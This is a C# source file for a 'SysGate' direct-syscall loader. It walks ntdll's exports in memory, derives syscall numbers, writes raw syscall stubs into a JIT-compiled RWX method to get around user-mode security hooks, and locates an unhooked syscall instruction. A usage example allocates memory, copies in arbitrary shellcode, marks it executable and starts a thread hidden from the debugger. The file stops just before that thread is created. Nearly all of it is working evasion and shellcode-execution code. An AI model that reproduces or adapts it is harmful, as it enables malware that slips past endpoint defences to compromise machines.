using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.IO;
using System.Runtime.CompilerServices;
using System.Reflection;

public class SysGate {

    public bool IsGateReady = false;

    public bool IsSyscallReady = false;

    public IntPtr GatePositionAddress = IntPtr.Zero;

    public Dictionary<UInt64, SyscallTableEntry> SyscallTableEntries = new Dictionary<UInt64, SyscallTableEntry>();

    public IntPtr SyscallExecuterAddress = IntPtr.Zero;

    public struct SyscallTableEntry {
        public string Name;
        public UInt64 Hash;
        public Int64 ExportAddress;
        public Int16 SyscallID;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private static UInt32 JITMeDaddy() {
        return new UInt32();
    }

    public static UInt64 GetFunctionDJB2Hash(string FunctionName) {
        if (string.IsNullOrEmpty(FunctionName))
            return 0;

        UInt64 hash = 0x7734773477347734;
        foreach (char c in FunctionName)
            hash = ((hash << 0x5) + hash) + (byte)c;

        return hash;
    }

    // managed to unmanaged
    public static unsafe void Copy(byte[] source, int startIndex, IntPtr destination, int length) {
        if (source == null || source.Length == 0 || destination == IntPtr.Zero || length == 0) {
            throw new ArgumentNullException("Exception : One or more of the arguments are zero/null!");
        }
        if ((startIndex + length) > source.Length) {
            throw new ArgumentOutOfRangeException("Exception : startIndex and length exceeds the size of source bytes!");
        }
        int targetIndex = 0;
        byte* TargetByte = (byte*)(destination.ToPointer());
        for (int sourceIndex = startIndex; sourceIndex < (startIndex + length); sourceIndex++) {
            *(TargetByte + targetIndex) = source[sourceIndex];
            targetIndex++;
        }
    }

    // unmanaged to managed
    public static unsafe void Copy(IntPtr source, ref byte[] destination, int startIndex, int length) {
        if (source == IntPtr.Zero || destination == null || destination.Length == 0 || length == 0) {
            throw new ArgumentNullException("Exception : One or more of the arguments are zero/null!");
        }
        if ((startIndex + length) > destination.Length) {
            throw new ArgumentOutOfRangeException("Exception : startIndex and length exceeds the size of destination bytes!");
        }
        byte* TargetByte = (byte*)(source.ToPointer());
        int sourceIndex = 0;
        for (int targetIndex = startIndex; targetIndex < (startIndex + length); targetIndex++) {
            destination[targetIndex] = *(TargetByte + sourceIndex);
            sourceIndex++;
        }
    }

    public static byte[] Combine(byte[] a1, byte[] a2, byte[] a3)
    {
        byte[] ret = new byte[a1.Length + a2.Length + a3.Length];
        Array.Copy(a1, 0, ret, 0, a1.Length);
        Array.Copy(a2, 0, ret, a1.Length, a2.Length);
        Array.Copy(a3, 0, ret, a1.Length + a2.Length, a3.Length);
        return ret;
    }


    public bool Gate(UInt64 Hash) {
        if (!this.IsGateReady || GatePositionAddress == IntPtr.Zero) {
            bool result = this.PrepareGateSpace();
            if (!result) 
                return false;
        }

        if (!this.SyscallTableEntries.ContainsKey(Hash))
            return false;
        Int16 SyscallID = this.SyscallTableEntries[Hash].SyscallID;

        byte[] stub = new byte[0];
        if (this.SyscallExecuterAddress != IntPtr.Zero) {
            byte[] jumpAddr = (IntPtr.Size == 4 ? BitConverter.GetBytes((Int32)SyscallExecuterAddress) : BitConverter.GetBytes((Int64)SyscallExecuterAddress));
            byte[] jumpStub = Combine(new byte[] { Convert.ToByte("49", 16), Convert.ToByte("BB", 16) }, jumpAddr, new byte[] { Convert.ToByte("41", 16), Convert.ToByte("FF", 16), Convert.ToByte("E3", 16) }); // move r11, <jump addr>; jmp r11;

            stub = new byte[8] {
                Convert.ToByte("4C", 16), Convert.ToByte("8B", 16), Convert.ToByte("D1", 16), // move r10, rcx
                Convert.ToByte("B8", 16), (byte)SyscallID, (byte)(SyscallID >> 8), Convert.ToByte("00", 16), Convert.ToByte("00", 16), // mov eax, <syscall id>
            };
            stub = stub.Concat(jumpStub).ToArray();
        }else {
            // this one will acted like a fail safe if NtTestAlert is hooked
            stub = new byte[24] {
                Convert.ToByte("4C", 16), Convert.ToByte("8B", 16), Convert.ToByte("D1", 16),
                Convert.ToByte("B8", 16), (byte)SyscallID, (byte)(SyscallID >> 8), Convert.ToByte("00", 16), Convert.ToByte("00", 16),
                Convert.ToByte("F6", 16), Convert.ToByte("04", 16), Convert.ToByte("25", 16), Convert.ToByte("08", 16), Convert.ToByte("03", 16), Convert.ToByte("FE", 16), Convert.ToByte("7F", 16), Convert.ToByte("01", 16),
                Convert.ToByte("75", 16), Convert.ToByte("03", 16),
                Convert.ToByte("0F", 16), Convert.ToByte("05", 16),
                Convert.ToByte("C3", 16),
                Convert.ToByte("CD", 16), Convert.ToByte("2E", 16),
                Convert.ToByte("C3", 16)
            };
        }

        Copy(stub, 0, this.GatePositionAddress, stub.Length);
        Array.Clear(stub, 0, stub.Length); // clean up
        return true;
    }

    public bool PrepareGateSpace() {
        // Find and JIT the method to generate RWX space
        MethodInfo method = typeof(SysGate).GetMethod("JITMeDaddy", BindingFlags.Static | BindingFlags.NonPublic);
        if (method == null) {
            Console.WriteLine("Unable to find the method");
            return false;
        }
        RuntimeHelpers.PrepareMethod(method.MethodHandle);

        IntPtr pMethod = method.MethodHandle.GetFunctionPointer();

        this.GatePositionAddress = pMethod; // this works fine
        this.IsGateReady = true;
        return true;
    }

    public void CollectSyscalls() {
        if (IsSyscallReady) {
            this.ResetEntries();
        }

        IntPtr ModuleBase = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
        try {
            // Traverse the PE header in memory
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = 0;
            if (Magic == 0x010b) {
                pExport = OptHeader + 0x60;
            }
            else {
                pExport = OptHeader + 0x70;
            }

            // Read -> IMAGE_EXPORT_DIRECTORY
            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            List<SyscallTableEntry> TempNtFunctionList = new List<SyscallTableEntry>();

            for (int i = 0; i < NumberOfNames; i++) {
                string CurrentFunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                Int32 CurrentFunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                Int32 CurrentFunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (CurrentFunctionOrdinal - OrdinalBase))));
                IntPtr CurrentFunctionPtr = (IntPtr)((Int64)ModuleBase + CurrentFunctionRVA);

                if (CurrentFunctionName.StartsWith("Nt") && !CurrentFunctionName.StartsWith("Ntdll")) {
                    SyscallTableEntry currententrytable = new SyscallTableEntry();
                    currententrytable.Name = CurrentFunctionName;
                    currententrytable.ExportAddress = (Int64)CurrentFunctionPtr;
                    currententrytable.Hash = GetFunctionDJB2Hash(CurrentFunctionName);
                    TempNtFunctionList.Add(currententrytable);
                }
            }

            TempNtFunctionList = TempNtFunctionList.OrderBy(o => o.ExportAddress).ToList(); // order by address
            TempNtFunctionList = TempNtFunctionList.GroupBy(x => x.ExportAddress).Select(x => x.First()).ToList(); // remove duplicate if exist

            for (short i = 0; i < TempNtFunctionList.Count; i++) {
                SyscallTableEntry currententrytable = new SyscallTableEntry();
                currententrytable.Name = TempNtFunctionList[i].Name;
                currententrytable.ExportAddress = TempNtFunctionList[i].ExportAddress;
                currententrytable.SyscallID = i; // assign the syscall IDs
                currententrytable.Hash = TempNtFunctionList[i].Hash;
                this.SyscallTableEntries.Add(TempNtFunctionList[i].Hash, currententrytable);
            }
            this.IsSyscallReady = true;

            IntPtr SearchStartAddress = (IntPtr)SyscallTableEntries[GetFunctionDJB2Hash("NtTestAlert")].ExportAddress; // we just need to hope that NtTestAlert is not hooked :')
            byte[] SearchTarget = { Convert.ToByte("F6", 16), Convert.ToByte("04", 16), Convert.ToByte("25", 16), Convert.ToByte("08", 16), Convert.ToByte("03", 16), Convert.ToByte("FE", 16), Convert.ToByte("7F", 16), Convert.ToByte("01", 16), Convert.ToByte("75", 16), Convert.ToByte("03", 16), Convert.ToByte("0F", 16), Convert.ToByte("05", 16), Convert.ToByte("C3", 16), Convert.ToByte("CD", 16), Convert.ToByte("2E", 16), Convert.ToByte("C3", 16) }; // this way, we can still support x86 (legacy)
            for (int i = 0; i < 32; i++) {
                byte[] CurrentSearch = new byte[16];
                Copy((SearchStartAddress + i), ref CurrentSearch, 0, 16);
                if (CurrentSearch.SequenceEqual(SearchTarget)) {
                    SyscallExecuterAddress = SearchStartAddress + i;
                }
            }
        }catch { }
    }

    public void ResetEntries() {
        this.SyscallTableEntries.Clear();
        this.IsSyscallReady = false;
    }
}

public class UsageExample {
    [Flags]
    public enum AllocationType : ulong
    {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    };

    [Flags]
    public enum ACCESS_MASK : uint
    {
        DELETE = 0x00010000,
        READ_CONTROL = 0x00020000,
        WRITE_DAC = 0x00040000,
        WRITE_OWNER = 0x00080000,
        SYNCHRONIZE = 0x00100000,
        STANDARD_RIGHTS_REQUIRED = 0x000F0000,
        STANDARD_RIGHTS_READ = 0x00020000,
        STANDARD_RIGHTS_WRITE = 0x00020000,
        STANDARD_RIGHTS_EXECUTE = 0x00020000,
        STANDARD_RIGHTS_ALL = 0x001F0000,
        SPECIFIC_RIGHTS_ALL = 0x0000FFF,
        ACCESS_SYSTEM_SECURITY = 0x01000000,
        MAXIMUM_ALLOWED = 0x02000000,
        GENERIC_READ = 0x80000000,
        GENERIC_WRITE = 0x40000000,
        GENERIC_EXECUTE = 0x20000000,
        GENERIC_ALL = 0x10000000,
        DESKTOP_READOBJECTS = 0x00000001,
        DESKTOP_CREATEWINDOW = 0x00000002,
        DESKTOP_CREATEMENU = 0x00000004,
        DESKTOP_HOOKCONTROL = 0x00000008,
        DESKTOP_JOURNALRECORD = 0x00000010,
        DESKTOP_JOURNALPLAYBACK = 0x00000020,
        DESKTOP_ENUMERATE = 0x00000040,
        DESKTOP_WRITEOBJECTS = 0x00000080,
        DESKTOP_SWITCHDESKTOP = 0x00000100,
        WINSTA_ENUMDESKTOPS = 0x00000001,
        WINSTA_READATTRIBUTES = 0x00000002,
        WINSTA_ACCESSCLIPBOARD = 0x00000004,
        WINSTA_CREATEDESKTOP = 0x00000008,
        WINSTA_WRITEATTRIBUTES = 0x00000010,
        WINSTA_ACCESSGLOBALATOMS = 0x00000020,
        WINSTA_EXITWINDOWS = 0x00000040,
        WINSTA_ENUMERATE = 0x00000100,
        WINSTA_READSCREEN = 0x00000200,
        WINSTA_ALL_ACCESS = 0x0000037F,

        SECTION_ALL_ACCESS = 0x10000000,
        SECTION_QUERY = 0x0001,
        SECTION_MAP_WRITE = 0x0002,
        SECTION_MAP_READ = 0x0004,
        SECTION_MAP_EXECUTE = 0x0008,
        SECTION_EXTEND_SIZE = 0x0010
    };

    public enum NTSTATUS : uint {
        // Success
        Success = 0x00000000,
        Wait0 = 0x00000000,
        Wait1 = 0x00000001,
        Wait2 = 0x00000002,
        Wait3 = 0x00000003,
        Wait63 = 0x0000003f,
        Abandoned = 0x00000080,
        AbandonedWait0 = 0x00000080,
        AbandonedWait1 = 0x00000081,
        AbandonedWait2 = 0x00000082,
        AbandonedWait3 = 0x00000083,
        AbandonedWait63 = 0x000000bf,
        UserApc = 0x000000c0,
        KernelApc = 0x00000100,
        Alerted = 0x00000101,
        Timeout = 0x00000102,
        Pending = 0x00000103,
        Reparse = 0x00000104,
        MoreEntries = 0x00000105,
        NotAllAssigned = 0x00000106,
        SomeNotMapped = 0x00000107,
        OpLockBreakInProgress = 0x00000108,
        VolumeMounted = 0x00000109,
        RxActCommitted = 0x0000010a,
        NotifyCleanup = 0x0000010b,
        NotifyEnumDir = 0x0000010c,
        NoQuotasForAccount = 0x0000010d,
        PrimaryTransportConnectFailed = 0x0000010e,
        PageFaultTransition = 0x00000110,
        PageFaultDemandZero = 0x00000111,
        PageFaultCopyOnWrite = 0x00000112,
        PageFaultGuardPage = 0x00000113,
        PageFaultPagingFile = 0x00000114,
        CrashDump = 0x00000116,
        ReparseObject = 0x00000118,
        NothingToTerminate = 0x00000122,
        ProcessNotInJob = 0x00000123,
        ProcessInJob = 0x00000124,
        ProcessCloned = 0x00000129,
        FileLockedWithOnlyReaders = 0x0000012a,
        FileLockedWithWriters = 0x0000012b,

        // Informational
        Informational = 0x40000000,
        ObjectNameExists = 0x40000000,
        ThreadWasSuspended = 0x40000001,
        WorkingSetLimitRange = 0x40000002,
        ImageNotAtBase = 0x40000003,
        RegistryRecovered = 0x40000009,

        // Warning
        Warning = 0x80000000,
        GuardPageViolation = 0x80000001,
        DatatypeMisalignment = 0x80000002,
        Breakpoint = 0x80000003,
        SingleStep = 0x80000004,
        BufferOverflow = 0x80000005,
        NoMoreFiles = 0x80000006,
        HandlesClosed = 0x8000000a,
        PartialCopy = 0x8000000d,
        DeviceBusy = 0x80000011,
        InvalidEaName = 0x80000013,
        EaListInconsistent = 0x80000014,
        NoMoreEntries = 0x8000001a,
        LongJump = 0x80000026,
        DllMightBeInsecure = 0x8000002b,

        // Error
        Error = 0xc0000000,
        Unsuccessful = 0xc0000001,
        NotImplemented = 0xc0000002,
        InvalidInfoClass = 0xc0000003,
        InfoLengthMismatch = 0xc0000004,
        AccessViolation = 0xc0000005,
        InPageError = 0xc0000006,
        PagefileQuota = 0xc0000007,
        InvalRunPEdle = 0xc0000008,
        BadInitialStack = 0xc0000009,
        BadInitialPc = 0xc000000a,
        InvalidCid = 0xc000000b,
        TimerNotCanceled = 0xc000000c,
        InvalidParameter = 0xc000000d,
        NoSuchDevice = 0xc000000e,
        NoSuchFile = 0xc000000f,
        InvalidDeviceRequest = 0xc0000010,
        EndOfFile = 0xc0000011,
        WrongVolume = 0xc0000012,
        NoMediaInDevice = 0xc0000013,
        NoMemory = 0xc0000017,
        ConflictingAddresses = 0xc0000018,
        NotMappedView = 0xc0000019,
        UnableToFreeVm = 0xc000001a,
        UnableToDeleteSection = 0xc000001b,
        IllegalInstruction = 0xc000001d,
        AlreadyCommitted = 0xc0000021,
        AccessDenied = 0xc0000022,
        BufferTooSmall = 0xc0000023,
        ObjectTypeMismatch = 0xc0000024,
        NonContinuableException = 0xc0000025,
        BadStack = 0xc0000028,
        NotLocked = 0xc000002a,
        NotCommitted = 0xc000002d,
        InvalidParameterMix = 0xc0000030,
        ObjectNameInvalid = 0xc0000033,
        ObjectNameNotFound = 0xc0000034,
        ObjectNameCollision = 0xc0000035,
        ObjectPathInvalid = 0xc0000039,
        ObjectPathNotFound = 0xc000003a,
        ObjectPathSyntaxBad = 0xc000003b,
        DataOverrun = 0xc000003c,
        DataLate = 0xc000003d,
        DataError = 0xc000003e,
        CrcError = 0xc000003f,
        SectionTooBig = 0xc0000040,
        PortConnectionRefused = 0xc0000041,
        InvalidPortHandle = 0xc0000042,
        SharingViolation = 0xc0000043,
        QuotaExceeded = 0xc0000044,
        InvalidPageProtection = 0xc0000045,
        MutantNotOwned = 0xc0000046,
        SemaphoreLimitExceeded = 0xc0000047,
        PortAlreadySet = 0xc0000048,
        SectionNotImage = 0xc0000049,
        SuspendCountExceeded = 0xc000004a,
        ThreadIsTerminating = 0xc000004b,
        BadWorkingSetLimit = 0xc000004c,
        IncompatibleFileMap = 0xc000004d,
        SectionProtection = 0xc000004e,
        EasNotSupported = 0xc000004f,
        EaTooLarge = 0xc0000050,
        NonExistentEaEntry = 0xc0000051,
        NoEasOnFile = 0xc0000052,
        EaCorruptError = 0xc0000053,
        FileLockConflict = 0xc0000054,
        LockNotGranted = 0xc0000055,
        DeletePending = 0xc0000056,
        CtlFileNotSupported = 0xc0000057,
        UnknownRevision = 0xc0000058,
        RevisionMismatch = 0xc0000059,
        InvalidOwner = 0xc000005a,
        InvalidPrimaryGroup = 0xc000005b,
        NoImpersonationToken = 0xc000005c,
        CantDisableMandatory = 0xc000005d,
        NoLogonServers = 0xc000005e,
        NoSuchLogonSession = 0xc000005f,
        NoSuchPrivilege = 0xc0000060,
        PrivilegeNotHeld = 0xc0000061,
        InvalidAccountName = 0xc0000062,
        UserExists = 0xc0000063,
        NoSuchUser = 0xc0000064,
        GroupExists = 0xc0000065,
        NoSuchGroup = 0xc0000066,
        MemberInGroup = 0xc0000067,
        MemberNotInGroup = 0xc0000068,
        LastAdmin = 0xc0000069,
        WrongPassword = 0xc000006a,
        IllFormedPassword = 0xc000006b,
        PasswordRestriction = 0xc000006c,
        LogonFailure = 0xc000006d,
        AccountRestriction = 0xc000006e,
        InvalidLogonHours = 0xc000006f,
        InvalidWorkstation = 0xc0000070,
        PasswordExpired = 0xc0000071,
        AccountDisabled = 0xc0000072,
        NoneMapped = 0xc0000073,
        TooManyLuidsRequested = 0xc0000074,
        LuidsExhausted = 0xc0000075,
        InvalidSubAuthority = 0xc0000076,
        InvalidAcl = 0xc0000077,
        InvalidSid = 0xc0000078,
        InvalidSecurityDescr = 0xc0000079,
        ProcedureNotFound = 0xc000007a,
        InvalidImageFormat = 0xc000007b,
        NoToken = 0xc000007c,
        BadInheritanceAcl = 0xc000007d,
        RangeNotLocked = 0xc000007e,
        DiskFull = 0xc000007f,
        ServerDisabled = 0xc0000080,
        ServerNotDisabled = 0xc0000081,
        TooManyGuidsRequested = 0xc0000082,
        GuidsExhausted = 0xc0000083,
        InvalidIdAuthority = 0xc0000084,
        AgentsExhausted = 0xc0000085,
        InvalidVolumeLabel = 0xc0000086,
        SectionNotExtended = 0xc0000087,
        NotMappedData = 0xc0000088,
        ResourceDataNotFound = 0xc0000089,
        ResourceTypeNotFound = 0xc000008a,
        ResourceNameNotFound = 0xc000008b,
        ArrayBoundsExceeded = 0xc000008c,
        FloatDenormalOperand = 0xc000008d,
        FloatDivideByZero = 0xc000008e,
        FloatInexactResult = 0xc000008f,
        FloatInvalidOperation = 0xc0000090,
        FloatOverflow = 0xc0000091,
        FloatStackCheck = 0xc0000092,
        FloatUnderflow = 0xc0000093,
        IntegerDivideByZero = 0xc0000094,
        IntegerOverflow = 0xc0000095,
        PrivilegedInstruction = 0xc0000096,
        TooManyPagingFiles = 0xc0000097,
        FileInvalid = 0xc0000098,
        InsufficientResources = 0xc000009a,
        InstanceNotAvailable = 0xc00000ab,
        PipeNotAvailable = 0xc00000ac,
        InvalidPipeState = 0xc00000ad,
        PipeBusy = 0xc00000ae,
        IllegalFunction = 0xc00000af,
        PipeDisconnected = 0xc00000b0,
        PipeClosing = 0xc00000b1,
        PipeConnected = 0xc00000b2,
        PipeListening = 0xc00000b3,
        InvalidReadMode = 0xc00000b4,
        IoTimeout = 0xc00000b5,
        FileForcedClosed = 0xc00000b6,
        ProfilingNotStarted = 0xc00000b7,
        ProfilingNotStopped = 0xc00000b8,
        NotSameDevice = 0xc00000d4,
        FileRenamed = 0xc00000d5,
        CantWait = 0xc00000d8,
        PipeEmpty = 0xc00000d9,
        CantTerminateSelf = 0xc00000db,
        InternalError = 0xc00000e5,
        InvalidParameter1 = 0xc00000ef,
        InvalidParameter2 = 0xc00000f0,
        InvalidParameter3 = 0xc00000f1,
        InvalidParameter4 = 0xc00000f2,
        InvalidParameter5 = 0xc00000f3,
        InvalidParameter6 = 0xc00000f4,
        InvalidParameter7 = 0xc00000f5,
        InvalidParameter8 = 0xc00000f6,
        InvalidParameter9 = 0xc00000f7,
        InvalidParameter10 = 0xc00000f8,
        InvalidParameter11 = 0xc00000f9,
        InvalidParameter12 = 0xc00000fa,
        ProcessIsTerminating = 0xc000010a,
        MappedFileSizeZero = 0xc000011e,
        TooManyOpenedFiles = 0xc000011f,
        Cancelled = 0xc0000120,
        CannotDelete = 0xc0000121,
        InvalidComputerName = 0xc0000122,
        FileDeleted = 0xc0000123,
        SpecialAccount = 0xc0000124,
        SpecialGroup = 0xc0000125,
        SpecialUser = 0xc0000126,
        MembersPrimaryGroup = 0xc0000127,
        FileClosed = 0xc0000128,
        TooManyThreads = 0xc0000129,
        ThreadNotInProcess = 0xc000012a,
        TokenAlreadyInUse = 0xc000012b,
        PagefileQuotaExceeded = 0xc000012c,
        CommitmentLimit = 0xc000012d,
        InvalidImageLeFormat = 0xc000012e,
        InvalidImageNotMz = 0xc000012f,
        InvalidImageProtect = 0xc0000130,
        InvalidImageWin16 = 0xc0000131,
        LogonServer = 0xc0000132,
        DifferenceAtDc = 0xc0000133,
        SynchronizationRequired = 0xc0000134,
        DllNotFound = 0xc0000135,
        IoPrivilegeFailed = 0xc0000137,
        OrdinalNotFound = 0xc0000138,
        EntryPointNotFound = 0xc0000139,
        ControlCExit = 0xc000013a,
        InvalidAddress = 0xc0000141,
        PortNotSet = 0xc0000353,
        DebuggerInactive = 0xc0000354,
        CallbackBypass = 0xc0000503,
        PortClosed = 0xc0000700,
        MessageLost = 0xc0000701,
        InvalidMessage = 0xc0000702,
        RequestCanceled = 0xc0000703,
        RecursiveDispatch = 0xc0000704,
        LpcReceiveBufferExpected = 0xc0000705,
        LpcInvalidConnectionUsage = 0xc0000706,
        LpcRequestsNotAllowed = 0xc0000707,
        ResourceInUse = 0xc0000708,
        ProcessIsProtected = 0xc0000712,
        VolumeDirty = 0xc0000806,
        FileCheckedOut = 0xc0000901,
        CheckOutRequired = 0xc0000902,
        BadFileType = 0xc0000903,
        FileTooLarge = 0xc0000904,
        FormsAuthRequired = 0xc0000905,
        VirusInfected = 0xc0000906,
        VirusDeleted = 0xc0000907,
        TransactionalConflict = 0xc0190001,
        InvalidTransaction = 0xc0190002,
        TransactionNotActive = 0xc0190003,
        TmInitializationFailed = 0xc0190004,
        RmNotActive = 0xc0190005,
        RmMetadataCorrupt = 0xc0190006,
        TransactionNotJoined = 0xc0190007,
        DirectoryNotRm = 0xc0190008,
        CouldNotResizeLog = 0xc0190009,
        TransactionsUnsupportedRemote = 0xc019000a,
        LogResizeInvalidSize = 0xc019000b,
        RemoteFileVersionMismatch = 0xc019000c,
        CrmProtocolAlreadyExists = 0xc019000f,
        TransactionPropagationFailed = 0xc0190010,
        CrmProtocolNotFound = 0xc0190011,
        TransactionSuperiorExists = 0xc0190012,
        TransactionRequestNotValid = 0xc0190013,
        TransactionNotRequested = 0xc0190014,
        TransactionAlreadyAborted = 0xc0190015,
        TransactionAlreadyCommitted = 0xc0190016,
        TransactionInvalidMarshallBuffer = 0xc0190017,
        CurrentTransactionNotValid = 0xc0190018,
        LogGrowthFailed = 0xc0190019,
        ObjectNoLongerExists = 0xc0190021,
        StreamMiniversionNotFound = 0xc0190022,
        StreamMiniversionNotValid = 0xc0190023,
        MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
        CantOpenMiniversionWithModifyIntent = 0xc0190025,
        CantCreateMoreStreamMiniversions = 0xc0190026,
        HandleNoLongerValid = 0xc0190028,
        NoTxfMetadata = 0xc0190029,
        LogCorruptionDetected = 0xc0190030,
        CantRecoverWithHandleOpen = 0xc0190031,
        RmDisconnected = 0xc0190032,
        EnlistmentNotSuperior = 0xc0190033,
        RecoveryNotNeeded = 0xc0190034,
        RmAlreadyStarted = 0xc0190035,
        FileIdentityNotPersistent = 0xc0190036,
        CantBreakTransactionalDependency = 0xc0190037,
        CantCrossRmBoundary = 0xc0190038,
        TxfDirNotEmpty = 0xc0190039,
        IndoubtTransactionsExist = 0xc019003a,
        TmVolatile = 0xc019003b,
        RollbackTimerExpired = 0xc019003c,
        TxfAttributeCorrupt = 0xc019003d,
        EfsNotAllowedInTransaction = 0xc019003e,
        TransactionalOpenNotAllowed = 0xc019003f,
        TransactedMappingUnsupportedRemote = 0xc0190040,
        TxfMetadataAlreadyPresent = 0xc0190041,
        TransactionScopeCallbacksNotSet = 0xc0190042,
        TransactionRequiredPromotion = 0xc0190043,
        CannotExecuteFileInTransaction = 0xc0190044,
        TransactionsNotFrozen = 0xc0190045,

        MaximumNtStatus = 0xffffffff
    }

    [Flags]
    public enum ThreadCreateFlags : ulong {
        THREAD_CREATE_FLAGS_NONE = 0x00000000,
        THREAD_CREATE_FLAGS_CREATE_SUSPENDED =  0x00000001,
        THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH = 0x00000002,
        THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER = 0x00000004,
        THREAD_CREATE_FLAGS_HAS_SECURITY_DESCRIPTOR = 0x00000010,
        THREAD_CREATE_FLAGS_ACCESS_CHECK_IN_TARGET = 0x00000020,
        THREAD_CREATE_FLAGS_INITIAL_THREAD = 0x00000080
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate NTSTATUS NTAVMDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate NTSTATUS NTCTEDelegate(
        out IntPtr threadHandle,
        ACCESS_MASK desiredAccess,
        IntPtr objectAttributes,
        IntPtr processHandle,
        IntPtr startAddress,
        IntPtr parameter,
        ThreadCreateFlags createSuspended,
        int stackZeroBits,
        int sizeOfStack,
        int maximumStackSize,
        IntPtr attributeList);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate NTSTATUS NTPVMDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate NTSTATUS NTWFSODelegate(IntPtr handle, bool Alertable, long TimeOut);

    public static void Main(byte[] ShellcodeBytes) {
        // get function hashes
        UInt64 NTAVMHash = SysGate.GetFunctionDJB2Hash("NtAllocateVirtualMemory");
        UInt64 NTCTEHash = SysGate.GetFunctionDJB2Hash("NtCreateThreadEx");
        UInt64 NTPVMHash = SysGate.GetFunctionDJB2Hash("NtProtectVirtualMemory");
        UInt64 NTWFSOHash = SysGate.GetFunctionDJB2Hash("NtWaitForSingleObject");

        // initialize a new SharpHalos object
        SysGate sysgate = new SysGate();
        
        // prepare gate space before using the gate
        bool result = sysgate.PrepareGateSpace();
        if (!result) {
            Console.WriteLine("Failed to prepare gate space!");
            return;
        }

        // you can initialize the delegate any time you want after preparing the gate space
        NTAVMDelegate NTAVM = (NTAVMDelegate)Marshal.GetDelegateForFunctionPointer(sysgate.GatePositionAddress, typeof(NTAVMDelegate));
        NTCTEDelegate NTCTE = (NTCTEDelegate)Marshal.GetDelegateForFunctionPointer(sysgate.GatePositionAddress, typeof(NTCTEDelegate));
        NTPVMDelegate NTPVM = (NTPVMDelegate)Marshal.GetDelegateForFunctionPointer(sysgate.GatePositionAddress, typeof(NTPVMDelegate));
        NTWFSODelegate NTWFSO = (NTWFSODelegate)Marshal.GetDelegateForFunctionPointer(sysgate.GatePositionAddress, typeof(NTWFSODelegate));

        // collect all syscall IDs
        sysgate.CollectSyscalls(); // the syscall informations will be stored on the SysGate object
        if (!sysgate.IsSyscallReady) {
            Console.WriteLine("Failed to collect syscall!");
        }

        IntPtr ProcessHandle = new IntPtr(-1); // pseudo-handle for current process
        IntPtr ShellcodeBytesLength = new IntPtr(ShellcodeBytes.Length);
        IntPtr AllocationAddress = new IntPtr();
        IntPtr ZeroBitsThatZero = IntPtr.Zero;
        UInt32 AllocationTypeUsed = (UInt32)AllocationType.Commit | (UInt32)AllocationType.Reserve;
        Console.WriteLine("[*] Allocating memory...");
        sysgate.Gate(NTAVMHash); // dont forget to set the gate to your destination function ;)
        NTAVM(ProcessHandle, ref AllocationAddress, ZeroBitsThatZero, ref ShellcodeBytesLength, AllocationTypeUsed, 0x04);
        
        Console.WriteLine("[*] Copying Shellcode...");
        Marshal.Copy(ShellcodeBytes, 0, AllocationAddress, ShellcodeBytes.Length);
        
        Console.WriteLine("[*] Changing memory protection setting...");
        UInt32 newProtect = 0;
        sysgate.Gate(NTPVMHash);
        NTPVM(ProcessHandle, ref AllocationAddress, ref ShellcodeBytesLength, 0x20, ref newProtect);
        
        IntPtr threadHandle = new IntPtr(0);
        ACCESS_MASK desiredAccess = ACCESS_MASK.SPECIFIC_RIGHTS_ALL | ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
        IntPtr pObjectAttributes = new IntPtr(0);
        IntPtr lpParameter = new IntPtr(0);
        ThreadCreateFlags createFlags = ThreadCreateFlags.THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER;
        int stackZeroBits = 0;
        int sizeOfStackCommit = 0xFFFF;
        int sizeOfStackReserve = 0xFFFF;
        IntPtr pBytesBuffer = new IntPtr(0);
        // create new thread
        Console.WriteLine("[*] Creating new thread to execute the Shellcode...");
        sysgate.Gate(NTCTEHash);
